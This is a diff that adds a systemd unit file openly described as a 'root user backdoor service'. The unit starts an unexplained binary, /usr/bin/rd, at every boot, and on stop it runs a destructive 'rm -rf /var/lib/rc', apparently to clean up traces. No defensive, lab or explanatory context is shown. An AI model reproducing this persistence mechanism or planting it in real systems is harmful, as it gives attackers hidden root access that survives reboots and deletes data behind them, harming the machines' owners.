@@ -1,0 +1,10 @@
+[Unit]
+Description=root user backdoor service
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/rd
+ExecStop=/bin/rm -rf /var/lib/rc
+
+[Install]
+WantedBy=multi-user.target
